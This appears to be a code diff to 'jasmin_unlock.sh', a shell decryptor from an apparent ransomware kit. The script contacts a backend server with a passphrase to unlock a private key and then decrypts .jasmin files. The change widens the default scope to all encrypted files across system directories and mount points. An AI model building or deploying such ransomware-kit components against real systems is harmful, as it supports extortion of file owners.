@@ -6,9 +6,14 @@
 # 用法:
 #   sh jasmin_unlock.sh <后台地址> <K口令> [目录1 目录2 ...]
 #
+# 不指定目录时 => 解密【全部】加密文件（扫描 /home /root /var /opt /tmp /srv
+#                 及所有真实挂载点下每一个 .jasmin）。
+# 指定目录时    => 只解密这些目录（逗号或空格分隔均可）。
+#
 # 示例:
-#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6cf636bbbc0ff5e685e91eab8b /data
-#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6cf636bbbc0ff5e685e91eab8b   # 默认当前目录
+#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6c...             # 解密全部
+#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6c... /data       # 只解 /data
+#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6c... /data /srv  # 多个目录
 # ════════════════════════════════════════════════════════════════
 # 强制 C locale：二进制↔十六进制转换不能被 UTF-8 污染
 export LC_ALL=C
@@ -24,12 +29,14 @@ if [ -z "$SRV" ] || [ -z "$K" ]; then
     exit 1
 fi
 
-# 目录：未指定则用当前目录（比默认全盘更安全）
+# 目录：未指定 => 解密全部加密文件（下面不向解密器传目录，由它用全量默认范围）
 if [ -n "$*" ]; then
-    DIRS="$*"
+    # 允许逗号分隔，统一转成空格分隔
+    DIRS=$(printf '%s' "$*" | tr ',' ' ')
+    echo "[*] 指定目录: $DIRS"
 else
-    DIRS="$(pwd)"
-    echo "[*] 未指定目录，使用当前目录: $DIRS"
+    DIRS=""
+    echo "[*] 未指定目录 — 将解密全部加密文件（6 个默认根目录 + 真实挂载点）"
 fi
 
 command -v openssl >/dev/null 2>&1 || { echo "[!] 缺少 openssl，无法解密"; exit 1; }
@@ -93,7 +100,11 @@ echo "[+] 私钥已解开 ($OK)"
 # ── 执行解密 ──
 echo "[*] 开始解密文件..."
 echo ""
-sh "$TD/dec.sh" "$TD/priv.pem" $DIRS
+if [ -n "$DIRS" ]; then
+    sh "$TD/dec.sh" "$TD/priv.pem" $DIRS
+else
+    sh "$TD/dec.sh" "$TD/priv.pem"          # 不传目录 => 解密器扫描全量范围
+fi
 RC=$?
 echo ""
 if [ "$RC" -eq 0 ]; then
